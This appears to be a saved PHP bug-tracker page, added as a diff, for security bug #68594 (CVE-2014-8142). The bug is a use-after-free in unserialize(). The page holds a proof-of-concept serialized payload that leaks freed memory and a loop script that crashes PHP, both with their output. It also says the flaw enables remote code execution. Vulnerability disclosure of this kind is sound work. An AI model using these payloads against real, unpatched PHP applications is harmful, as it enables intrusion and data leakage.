@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    
+        <link rel='alternate' type='application/rss+xml' title='*Data Exchange functions Bug #68594 - RDF' href='rss/bug.php?id=68594'>
+        <link rel='alternate' type='application/rss+xml' title='*Data Exchange functions Bug #68594 - RSS 2.0' href='rss/bug.php?id=68594&format=rss2'>
+        <base href="https://bugs.php.net/">
+    <title>PHP :: Sec Bug #68594 :: Use after free vulnerability in unserialize()</title>
+    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
+    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
+</head>
+
+<body>
+
+<table id="top" class="head" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="head-logo">
+            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
+        </td>
+
+        <td class="head-menu">
+            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
+            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
+            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
+            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
+            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
+            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
+            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
+            <a href="random">random bug</a>&nbsp;|&nbsp;
+            <a href="login.php">login</a>
+        </td>
+    </tr>
+
+    <tr>
+        <td class="head-search" colspan="2">
+            <form method="get" action="search.php">
+                <p class="head-search">
+                    <input type="hidden" name="cmd" value="display">
+                    <small>go to bug id or search bugs for</small>
+                    <input class="small" type="text" name="search_for" value="" size="30">
+                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
+                </p>
+            </form>
+        </td>
+    </tr>
+</table>
+
+<table class="middle" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="content">
+<div id="bugheader">
+    <table id="details">
+        <tr id="title">
+            <th class="details" id="number"><a href="bug.php?id=68594">Sec Bug</a>&nbsp;#68594</th>
+            <td id="summary" colspan="5">Use after free vulnerability in unserialize()</td>
+        </tr>
+        <tr id="submission">
+            <th class="details">Submitted:</th>
+            <td style="white-space: nowrap;">2014-12-12 03:21 UTC</td>
+            <th class="details">Modified:</th>
+            <td style="white-space: nowrap;">2014-12-19 09:44 UTC</td>
+            <td rowspan="6">
+
+
+            </td>
+        </tr>
+
+        <tr id="submitter">
+            <th class="details">From:</th>
+            <td>stas@php.net</td>
+            <th class="details">Assigned:</th>
+            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
+        </tr>
+
+        <tr id="categorization">
+            <th class="details">Status:</th>
+            <td>Closed</td>
+            <th class="details">Package:</th>
+            <td><a href="search.php?cmd=display&amp;package_name[]=%2AData+Exchange+functions">*Data Exchange functions</a></td>
+        </tr>
+
+        <tr id="situation">
+            <th class="details">PHP Version:</th>
+            <td>5.4.35</td>
+            <th class="details">OS:</th>
+            <td>*</td>
+        </tr>
+
+        <tr id="private">
+            <th class="details">Private report:</th>
+            <td>No</td>
+            <th class="details">CVE-ID:</th>
+            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8142" target="_blank">2014-8142</a></td>
+        </tr>
+    </table>
+</div>
+
+<div class="controls">
+<span id='control_0' class='control active'>View</span>
+<span id='control_3' class='control'><a href='bug.php?id=68594&amp;edit=3'>Add Comment</a></span>
+<span id='control_1' class='control'><a href='bug.php?id=68594&amp;edit=1'>Developer</a></span>
+<span id='control_2' class='control'><a href='bug.php?id=68594&amp;edit=2'>Edit</a></span>
+</div>
+<div class="clear"></div>
+
+
+
+<div class='comment type_comment' ><a name="1418354492">&nbsp;</a><strong>[2014-12-12 03:21 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Description:
+------------
+Reported by Stefan Esser &lt;stefan.esser@sektioneins.de&gt;:
+
+A while ago the function &quot;process_nested_data&quot; was changed to better
+handle object properties. Before it was possible to create numeric
+object properties which would cause trouble down the road. So the
+following code was added:
+
+        if (!objprops) {
+            ...
+        } else {
+            /* object properties should include no integers */
+            convert_to_string(key);
+            zend_hash_update(ht, Z_STRVAL_P(key), Z_STRLEN_P(key) + 1,
+&amp;data,
+                    sizeof data, NULL);
+        }
+
+Whoever wrote this code did not know about the history of the
+unserialize() function and that in earlier times (2004) I found a use
+after free vulnerability in it. A non detailed write up can be found in
+<a href="http://seclists.org/fulldisclosure/2004/Dec/356" rel="nofollow">http://seclists.org/fulldisclosure/2004/Dec/356</a> [<a href='bug.php?id=7'>Bug 7</a>].
+
+The problem with the above code is that when there are two identical
+keys in the object's serialized properties the second key will delete
+the first one from memory and destroy the ZVAL associated with it. This
+means that ZVAL and all its children is freed from memory. However the
+unserialize() code will still allow to use R: or r: to set references to
+that already freed memory. It has been demonstrated many times before
+that use after free inside unserialize() allows an attacker to execute
+arbitrary code. Also some programs do not only unserialize() user input
+but they also sent a serialized() reply back to the caller. In such a
+setup an attacker can not only trigger code execution but also leak
+memory content from remote. This together means he can write a fully
+working remote exploit that bypasses all modern mitigations. Examples
+how that was possible before you can see from this slide deck (starting
+from slide 30)
+<a href="http://www.slideshare.net/i0n1c/syscan-singapore-2010-returning-into-the-phpinterpreter" rel="nofollow">http://www.slideshare.net/i0n1c/syscan-singapore-2010-returning-into-the-phpinterpreter</a>
+
+Last time I checked one prominent example of PHP code that uses
+unserialize() and serialize() in this way is: SugarCRM
+
+The following code shows the leak:
+
+&lt;?php
+
+$data =
+'O:8:&quot;stdClass&quot;:3:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;s:39:&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;}';
+
+$x = unserialize($data);
+var_dump($x);
+
+
+$ php test.php
+object(stdClass)#1 (2) {
+  [&quot;aaa&quot;]=&gt;
+  int(1)
+  [&quot;ccc&quot;]=&gt;
+  &amp;string(39) &quot;1Y?/&quot;
+}
+
+And the following code should crash PHP:
+
+&lt;?php
+
+for ($i=4; $i&lt;100; $i++) {
+
+var_dump($i);
+
+$m = new StdClass();
+
+$u = array(1);
+
+$m-&gt;aaa = array(1,2,&amp;$u,4,5);
+$m-&gt;bbb = 1;
+$m-&gt;ccc = &amp;$u;
+$m-&gt;ddd = str_repeat(&quot;A&quot;, $i);
+
+$z = serialize($m);
+$z = str_replace(&quot;bbb&quot;, &quot;aaa&quot;, $z);
+var_dump($z);
+$y = unserialize($z);
+var_dump($y);
+}
+
+
+As you can see here:
+
+$ php x.php
+int(4)
+string(134)
+&quot;O:8:&quot;stdClass&quot;:4:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;s:3:&quot;ddd&quot;;s:4:&quot;AAAA&quot;;}&quot;
+object(stdClass)#2 (3) {
+  [&quot;aaa&quot;]=&gt;
+  int(1)
+  [&quot;ccc&quot;]=&gt;
+  &amp;NULL
+  [&quot;ddd&quot;]=&gt;
+  string(4) &quot;AAAA&quot;
+}
+int(5)
+string(135)
+&quot;O:8:&quot;stdClass&quot;:4:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;s:3:&quot;ddd&quot;;s:5:&quot;AAAAA&quot;;}&quot;
+object(stdClass)#1 (3) {
+  [&quot;aaa&quot;]=&gt;
+  int(1)
+  [&quot;ccc&quot;]=&gt;
+  &amp;NULL
+  [&quot;ddd&quot;]=&gt;
+  string(5) &quot;AAAAA&quot;
+}
+int(6)
+string(136)
+&quot;O:8:&quot;stdClass&quot;:4:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;s:3:&quot;ddd&quot;;s:6:&quot;AAAAAA&quot;;}&quot;
+Segmentation fault: 11
+
+Somewhen before you fix and release this I will prepare a POC that
+demonstrates full control over the program counter and to leak specific
+stuff from the system.
+
+
+
+</pre>
+</div><h2>Patches</h2>
+<p><a href='patch-add.php?bug_id=68594'>Add a Patch</a></p><h2>Pull Requests</h2>
+<p><a href='gh-pull-add.php?bug_id=68594'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
+            <div id='comments_view' style='clear:both;'>
+<div class='comment type_log' ><a name="1418453674">&nbsp;</a><strong>[2014-12-13 06:54 UTC] <a href="//people.php.net/remi">remi@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-CVE-ID:</span>
+<span class="added">+CVE-ID: 2014-8142</span>
+</div></div></div><div class='comment type_comment' ><a name="1418453674">&nbsp;</a><strong>[2014-12-13 06:54 UTC] <a href="//people.php.net/remi">remi@php.net</a></strong>
+<pre class='note'>Please use CVE-2014-8142 for this issue.
+</pre>
+</div><div class='comment type_log' ><a name="1418982257">&nbsp;</a><strong>[2014-12-19 09:44 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status:      Open</span>
+<span class="added">+Status:      Closed</span>
+<span class="removed">-Assigned To:</span>
+<span class="added">+Assigned To: stas</span>
+</div></div></div><div class='comment type_comment' ><a name="1418982257">&nbsp;</a><strong>[2014-12-19 09:44 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>The fix for this bug has been committed.
+
+Snapshots of the sources are packaged every three hours; this change
+will be in the next snapshot. You can grab the snapshot at
+<a href="http://snaps.php.net/" rel="nofollow">http://snaps.php.net/</a>.
+
+ For Windows:
+
+<a href="http://windows.php.net/snapshots/" rel="nofollow">http://windows.php.net/snapshots/</a>
+ 
+Thank you for the report, and for helping us make PHP better.
+
+
+</pre>
+</div></div>
+        </td>
+    </tr>
+</table>
+
+<script src='js/util.js'></script>
+<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
+<script src="js/jquery.cookie.js"></script>
+<script>
+function do_comment(nd)
+{
+    $('#comment_filter > .control.active').removeClass("active");
+    $(nd).addClass("active");
+
+    $.cookie('history_tab', nd.id, { expires: 365 });
+
+    if (nd.id == 'type_all') {
+        $('#comments_view > .comment:hidden').show('slow');
+    } else {
+        $('#comments_view > .comment').each(function(i) {
+            if ($(this).hasClass(nd.id)) {
+                $(this).show('slow');
+            } else {
+                $(this).hide('slow');
+            }
+        });
+    }
+    return false;
+}
+</script>
+<table class="foot" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="foot-bar" colspan="2">&nbsp;</td>
+    </tr>
+
+    <tr>
+        <td class="foot-copy">
+            <small>
+                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
+                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
+                All rights reserved.
+            </small>
+        </td>
+        <td class="foot-source">
+            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
+        </td>
+    </tr>
+</table>
+</body>
+</html>
